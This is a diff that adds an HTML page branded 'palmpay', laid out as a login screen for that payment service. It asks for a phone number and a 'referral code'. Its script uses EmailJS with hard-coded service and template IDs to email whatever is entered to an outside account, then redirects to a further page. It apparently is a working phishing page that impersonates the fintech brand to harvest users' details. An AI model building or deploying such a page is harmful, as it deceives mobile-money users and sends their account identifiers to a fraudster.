@@ -1,0 +1,119 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>palmpay</title>
+
+    <!-- Include EmailJS library -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+    <script type="text/javascript">
+        // Initialize EmailJS
+        (function () {
+            emailjs.init("brHvxqtsePQc4PuqQ"); // Replace with your public key
+        })();
+
+        // Function to send email and redirect
+        function handleSendAndLogin(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get form input values
+            const phone = document.getElementById("phone").value;
+            const referral = document.getElementById("referral").value;
+
+            // Prepare email parameters
+            const emailParams = {
+                phone_number: phone,
+                referral_code: referral
+            };
+
+            // Send email using EmailJS
+            emailjs.send("service_p5v1sz7", "template_ak5d8h8", emailParams)
+                .then((response) => {
+                    console.log("Email sent successfully:", response);
+                    alert("Your details have been sent successfully!");
+
+                    // Redirect after successful email
+                    window.location.href = "palm3.html";
+                })
+                .catch((error) => {
+                    console.error("Error sending email:", error);
+                    alert("Failed to send details. Please try again.");
+                });
+        }
+    </script>
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: rgb(153, 0, 255);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+        .login-container h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            color: #333;
+        }
+        .form-group {
+            margin-bottom: 15px;
+        }
+        .form-group label {
+            display: block;
+            margin-bottom: 5px;
+            color: #555;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .form-group button {
+            width: 100%;
+            padding: 10px;
+            background-color:blueviolet;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .form-group button:hover {
+            background-color:lightblue;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h1>palmpay</h1>
+        <form onsubmit="handleSendAndLogin(event)">
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="text" id="phone" name="phone" required>
+            </div>
+            <div class="form-group">
+                <label for="referral">Referral Code</label>
+                <input type="text" id="referral" name="referral" required>
+            </div>
+            <div class="form-group">
+                <button type="submit">Send & Login</button>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
